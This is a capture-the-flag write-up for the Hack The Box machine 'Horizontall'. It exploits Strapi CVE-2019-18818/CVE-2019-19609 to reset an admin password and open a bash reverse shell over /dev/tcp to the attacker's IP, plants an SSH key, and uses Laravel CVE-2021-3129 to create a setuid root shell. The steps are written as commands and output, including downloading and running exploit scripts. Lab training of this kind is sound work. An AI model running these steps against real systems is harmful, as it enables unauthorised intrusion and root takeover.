# Target
| Category          | Details                                                                       |
|-------------------|-------------------------------------------------------------------------------|
| 📝 **Name**       | [Horizontall](https://app.hackthebox.com/machines/Horizontall)                |  
| 🏷 **Type**       | HTB Machine                                                                   |
| 🖥 **OS**         | Linux                                                                         |
| 🎯 **Difficulty** | Easy                                                                          |
| 📁 **Tags**       | Strapi 3.0.0-beta.17.4, CVE-2019-18818, CVE-2019-19609, Laravel CVE-2021-3129 |

# Scan
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

# Attack path
1. [Gain initial foothold exploiting CVE-2019-18818 and CVE-2019-19609 in Strapi 3.0.0-beta.17.4](#gain-initial-foothold-exploiting-cve-2019-18818-and-cve-2019-19609-in-strapi-300-beta174)
2. [Escalate to `root` user using CVE-2021-3129 in Laravel 8.4.2](#escalate-to-root-user-using-cve-2021-3129-in-laravel-842)

### Gain initial foothold exploiting [CVE-2019-18818](https://nvd.nist.gov/vuln/detail/CVE-2019-18818) and [CVE-2019-19609](https://nvd.nist.gov/vuln/detail/CVE-2019-19609) in Strapi 3.0.0-beta.17.4

#### Add `horizontall.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Horizontall]
└─$ echo "$TARGET horizontall.htb" | sudo tee -a /etc/hosts
10.129.176.133 horizontall.htb
```

#### Discover `api-prod` virtual host
```
┌──(magicrc㉿perun)-[~/attack/HTB Horizontall]
└─$ ffuf -r -u http://horizontall.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" -mc 200 -fs 901
<SNIP>
api-prod                [Status: 200, Size: 413, Words: 76, Lines: 20, Duration: 202ms]
```

#### Add `api-prod.horizontall.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Horizontall]
└─$ echo "$TARGET api-prod.horizontall.htb" | sudo tee -a /etc/hosts
10.129.176.133 api-prod.horizontall.htb
```

#### Identify Strapi CMS running at `api-prod.horizontall.htb`
```
┌──(magicrc㉿perun)-[~/attack/HTB Horizontall]
└─$ curl -I api-prod.horizontall.htb
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 15 Sep 2025 18:28:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 413
Connection: keep-alive
Vary: Origin
Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Last-Modified: Wed, 02 Jun 2021 20:00:29 GMT
Cache-Control: max-age=60
X-Powered-By: Strapi <strapi.io>
```

#### Identify `3.0.0-beta.17.4` version
```
┌──(magicrc㉿perun)-[~/attack/HTB Horizontall]
└─$ curl http://api-prod.horizontall.htb/admin/strapiVersion
{"strapiVersion":"3.0.0-beta.17.4"}
```

#### Start `netcat` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Horizontall]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
```

#### Exploit [CVE-2019-18818](https://nvd.nist.gov/vuln/detail/CVE-2019-18818) to reset admin password and [CVE-2019-19609](https://nvd.nist.gov/vuln/detail/CVE-2019-19609) to spawn reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Horizontall]
└─$ wget https://www.exploit-db.com/raw/50239 -O CVE-2019-18818_CVE-2019-19609.py && python3 CVE-2019-18818_CVE-2019-19609.py http://api-prod.horizontall.htb/
--2025-09-16 07:46:04--  https://www.exploit-db.com/raw/50239
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2509 (2.5K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                       100%[==========================================================================================================>]   2.45K  --.-KB/s    in 0s      

2025-09-16 07:46:04 (53.7 MB/s) - ‘exploit.py’ saved [2509/2509]

[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzU4MDAxNTY3LCJleHAiOjE3NjA1OTM1Njd9._qcPPU4TAWTTl6Cw16IxjuFMbweQu2i5wQLocmSLUw4


$> /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.34/4444 0>&1'
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```

#### Confirm initial foothold gained
```
connect to [10.10.16.34] from (UNKNOWN) [10.129.176.133] 33940
bash: cannot set terminal process group (1963): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$ id
id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
```

#### Upgrade reverse shell connection to SSH using private key
```
strapi@horizontall:~/myapi$ ssh-keygen -t rsa -b 4096 -f /opt/strapi/.ssh/id_rsa -N "" && \
cat /opt/strapi/.ssh/id_rsa.pub >> /opt/strapi/.ssh/authorized_keys && \
chmod 700 /opt/strapi/.ssh && chmod 600 /opt/strapi/.ssh/* &&
cat /opt/strapi/.ssh/id_rsa
Generating public/private rsa key pair.
Your identification has been saved in /opt/strapi/.ssh/id_rsa.
Your public key has been saved in /opt/strapi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:Hsp7YmOoziYtcINomWplPGcA9Dhm5q/JGUdsmSJhf2I strapi@horizontall
The key's randomart image is:
+---[RSA 4096]----+
|..               |
| .o              |
|.B..             |
|*.+.o            |
|o++E..  S        |
|=+O=o+ o .       |
|++o++.o .        |
|=oO . =..        |
|.X+. o.+         |
+----[SHA256]-----+
-----BEGIN RSA PRIVATE KEY-----
<SNIP>>
-----END RSA PRIVATE KEY-----
```

Copy & paste generated key to attack machine and use it to connect.
```
┌──(magicrc㉿perun)-[~/attack/HTB Horizontall]
└─$ chmod 600 id_rsa && ssh strapi@horizontall.htb -i id_rsa
<SNIP>
$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
```

### Escalate to `root` user using [CVE-2021-3129](https://nvd.nist.gov/vuln/detail/CVE-2021-3129) in Laravel 8.4.2

#### Discover application running on `127.0.0.1:8000`
```
$ netstat -natup
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
<SNIP> 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
<SNIP>
```

#### Setup SSH tunnel to `127.0.0.1:8000`
```
┌──(magicrc㉿perun)-[~/attack/HTB Horizontall]
└─$ ssh -L 8000:localhost:8000 -Nf strapi@horizontall.htb -i id_rsa
```

#### Identify application using Laravel v8
```
┌──(magicrc㉿perun)-[~/attack/HTB Horizontall]
└─$ curl -s http://127.0.0.1:8000/ | grep Laravel | tail -n 1 | sed -e 's/^[[:space:]]*//'
Laravel v8 (PHP v7.4.18)
```

#### Create root shell using [CVE-2021-3129](https://nvd.nist.gov/vuln/detail/CVE-2021-3129)
```
┌──(magicrc㉿perun)-[~/attack/HTB Horizontall]
└─$ wget https://www.exploit-db.com/raw/49424 -O CVE-2021-3129.py && \
python3 CVE-2021-3129.py http://127.0.0.1:8000 '../storage/logs/laravel.log' 'cp /bin/bash /tmp/root_shell;chmod +s /tmp/root_shell'
--2025-09-16 09:28:46--  https://www.exploit-db.com/raw/49424
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4181 (4.1K) [text/plain]
Saving to: ‘CVE-2021-3129.py’

CVE-2021-3129.py                                 100%[==========================================================================================================>]   4.08K  --.-KB/s    in 0s      

2025-09-16 09:28:46 (110 MB/s) - ‘CVE-2021-3129.py’ saved [4181/4181]

/home/magicrc/attack/HTB Horizontall/CVE-2021-3129.py:71: SyntaxWarning: invalid escape sequence '\/'
  command = command.replace('/', '\/')

Exploit...
```

#### Execute root shell as `strapi` user
```
$ /tmp/root_shell -p
root_shell-4.4# id
uid=1001(strapi) gid=1001(strapi) euid=0(root) egid=0(root) groups=0(root),1001(strapi)
```
